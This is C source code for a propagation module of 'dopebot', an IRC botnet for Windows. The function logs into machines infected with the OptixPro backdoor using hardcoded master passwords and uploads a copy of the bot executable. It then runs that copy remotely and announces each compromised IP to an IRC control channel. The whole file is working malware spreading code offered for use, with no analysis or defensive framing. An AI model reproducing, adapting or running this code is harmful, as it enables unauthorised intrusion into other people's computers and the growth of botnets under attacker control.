/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_OPTIX
#include "..\Bot\bot.h"

//Root OptixPro, All-Versions :)
bool rootoptix(exploitinfo exinfo)
{
//Log In
	bool IS11 = FALSE;
	char szBuffer[IRCBUF], szPassword[64];
	int iPass = 0;
	struct sockaddr_in opxinfo;
	SOCKET opxsock;
//	WSADATA opxdata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting optix root, rootoptix()\n");
#endif

start:
//	if (WSAStartup(MAKEWORD(2,2), &opxdata) != 0) return FALSE;
		opxinfo.sin_addr.s_addr = inet_addr(exinfo.szIP);
		opxinfo.sin_port = htons(exinfo.iPort);		
		opxinfo.sin_family = AF_INET;
		opxsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(opxsock, (struct sockaddr *)&opxinfo, sizeof(opxinfo)) == SOCKET_ERROR) 
	{
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}
	if (IS11)
	{
		if ((iPass != 2 || iPass != 3))
		{
				iPass = 1;
				sprintf(szPassword, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.1\r\n");
		}
	}
	else if (!IS11)
	{
		if ((iPass != 2 || iPass != 3))
		{
				iPass = 1;
				sprintf(szPassword, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.2\r\n");
		}
	}
		send(opxsock, szPassword, strlen(szPassword), 0);
		Sleep(500);
		recv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strstr(szBuffer, "001¬Your client version is outdated!") != NULL)
	{
			IS11 = TRUE;
			closesocket(opxsock);
//			WSACleanup();
			Sleep(5000);
		goto start;
	}
	else if (strstr(szBuffer, "001¬") == NULL)
	{
		if (IS11)
		{
			if ((iPass != 1 || iPass != 3))
			{
				iPass = 2;
					sprintf(szPassword, "022¬¬v1.1\r\n");
				goto start;
			}
		}
		else if (!IS11)
		{
			if ((iPass != 1 || iPass != 3))
			{
					iPass = 2;
					sprintf(szPassword, "022¬¬v1.2\r\n");
				goto start;
			}
		}
		if (IS11)
		{
			if ((iPass != 1 || iPass != 2))
			{
					iPass = 3;
					sprintf(szPassword, "022¬OPtest¬v1.1\r\n");
				goto start;
			}
		}
		else if (!IS11)
		{
			if ((iPass != 1 || iPass != 2))
			{
					iPass = 3;
					sprintf(szPassword, "022¬OPtest¬v1.2\r\n");
				goto start;
			}
		}
			closesocket(opxsock);
			return FALSE;
	}
		send(opxsock, "019¬\r\n", 6, 0);
		Sleep(500);
		recv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strstr(szBuffer, "020¬\r\n") == NULL)
	{
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}
//Upload
	char szFilePath[MAX_PATH];
	FILE *f;
	DWORD dwSize;
	HANDLE hFile;
	int iRead = 0, i;
	SOCKET uplsock;
	struct sockaddr_in uplinfo;
//	WSADATA upldata;
		GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));
#ifndef NO_FWB
	if (is_fwb())
	{
		char szSysDir[MAX_PATH];
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szFilePath, "%s\\%s", szSysDir, filename);
	}
#endif
		f = fopen(szFilePath, "rb");
	if (f == NULL)
	{	
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}
/*	if (WSAStartup(MAKEWORD(2,2), &upldata) != 0)
	{
			closesocket(opxsock);
			WSACleanup();
			return FALSE;
	}*/
		uplinfo.sin_addr.s_addr = inet_addr(exinfo.szIP);
		uplinfo.sin_port = htons(500);		
		uplinfo.sin_family = AF_INET;
		uplsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(uplsock, (struct sockaddr *)&uplinfo, sizeof(uplinfo)) == SOCKET_ERROR)
	{
			closesocket(uplsock);
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}		
		hFile = CreateFile(szFilePath, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			closesocket(uplsock);
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}
		dwSize = GetFileSize(hFile, 0);
		CloseHandle(hFile);
		srand(GetTickCount());
		i = rand()%99999;
		sprintf(szBuffer, "C:\\%i.exe\r\n%d\r\n", i, dwSize);
		send(uplsock, szBuffer, strlen(szBuffer), 0);
		Sleep(500);
		recv(uplsock, szBuffer, sizeof(szBuffer), 0);
	if (strstr(szBuffer, "+OK REDY") != NULL) 
	{
		while (!feof(f)) 
		{
				iRead = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
				send(uplsock, szBuffer, iRead, 0);
		}
			recv(uplsock, szBuffer, sizeof(szBuffer), 0);
			memcpy(szBuffer, szBuffer, 8);
		if (strstr(szBuffer, "+OK RCVD\r\n")  != NULL)
		{
				closesocket(uplsock);
				sprintf(szBuffer, "008¬C:\\%i.exe\r\n", i);
				send(opxsock, szBuffer, strlen(szBuffer), 0);
				Sleep(500);
				recv(opxsock, szBuffer, sizeof(szBuffer), 0);
			if (strstr(szBuffer, "001¬File Executed Successfully!") != NULL); //Filexecuted
			else
			{
					closesocket(uplsock);
					closesocket(opxsock);
//					WSACleanup();
					return FALSE;
			}
		}
		else
		{
				closesocket(uplsock);
				closesocket(opxsock);
//				WSACleanup();
				return FALSE;
		}
	}
	else
	{
			closesocket(uplsock);
			closesocket(opxsock);
//			WSACleanup();
			return FALSE;
	}
		send(opxsock, "100¬\r\n", 6, 0);
		closesocket(uplsock);
		closesocket(opxsock);
		WSACleanup();
		sprintf(szBuffer, "[OPTIX] exploited IP: %s", exinfo.szIP);
		irc_msg(exinfo.bsock, "PRIVMSG", (char *)exploitchannel, szBuffer);
		return TRUE;
}
#endif